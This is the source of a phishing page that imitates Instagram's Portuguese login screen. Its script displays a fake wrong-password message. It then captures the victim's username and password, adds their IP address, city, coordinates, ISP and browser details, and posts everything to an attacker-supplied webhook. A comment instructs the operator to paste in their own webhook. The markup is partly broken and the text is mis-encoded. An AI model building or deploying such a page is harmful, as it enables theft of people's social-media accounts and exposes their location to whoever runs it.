<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>

<body>
<div class="main-container">

        <div class="phone-image">
            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png" alt="Instagram screenshot 1" class="screenshot active">
            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/4d62acb667fb.png" alt="Instagram screenshot 2" class="screenshot">

            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
            <form id="loginForm">
                <input type="text" name="username" placeholder="Telefone, nome de usu√°rio ou email" required>

                <button type="submit">Entrar</button>

                Sua senha est√° incorreta. Confira-a.

</div>
<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    document.getElementById('errorMessage').style.display = 'block';

    const username = document.querySelector('input[name="username"]').value;
    const password = document.querySelector('input[name="password"]').value;

    try {
        const ipInfo = await axios.get('https://ipapi.co/json/');
        const userAgent = navigator.userAgent;

        const data = {
            content: "",
            embeds: [{
                title: "üö® Nova Tentativa de Login üö®",
                color: 16711680,
                fields: [
                    { name: "üë§ Usu√°rio", value: username, inline: true },
                    { name: "üîë Senha", value: password, inline: true },
                    { name: "üåÜ Cidade", value: ipInfo.data.city || "Desconhecida", inline: true },
                    { name: "üèôÔ∏è Regi√£o", value: ipInfo.data.region || "Desconhecida", inline: true },
                    { name: "üåé Pa√≠s", value: ipInfo.data.country_name || "Desconhecido", inline: true },
                    { name: "üåê ISP", value: ipInfo.data.org || "Desconhecido", inline: true },
                    { name: "üî¢ IP", value: ipInfo.data.ip || "Desconhecido", inline: true },
                    { name: "üåç Latitude", value: ipInfo.data.latitude?.toString() || "Desconhecida", inline: true },
                    { name: "üåé Longitude", value: ipInfo.data.longitude?.toString() || "Desconhecida", inline: true },
                    { name: "üï∞Ô∏è Fuso Hor√°rio", value: ipInfo.data.timezone || "Desconhecido", inline: true },
                    { name: "üì± Operadora", value: ipInfo.data.asn || "Desconhecida", inline: true },
                    { name: "üíª User Agent", value: userAgent }
                ],
                footer: {
                    text: "Capturado em " + new Date().toLocaleString()
                }
            }]
        };

        const response = await axios.post('COLOQUE SUA WEBHOOK', data); /* Apague o texto e cole sua webhook em que a mensagem ir√° ser enviada */
        console.log('Dados enviados com sucesso:', response.data);
    } catch (error) {
        console.error('Erro ao enviar dados:', error);
    }
});

const screenshots = document.querySelectorAll('.screenshot');
let currentIndex = 0;

function rotateScreenshots() {
    screenshots[currentIndex].classList.remove('active');
    currentIndex = (currentIndex + 1) % screenshots.length;
    screenshots[currentIndex].classList.add('active');
}

setInterval(rotateScreenshots, 5000);

document.querySelector('.facebook-login').addEventListener('click', function(e) {
    e.preventDefault();
});

document.querySelector('.forgot-password').addEventListener('click', function(e) {
    e.preventDefault();
});

document.querySelector('.signup-link').addEventListener('click', function(e) {
    e.preventDefault();
});
</script>
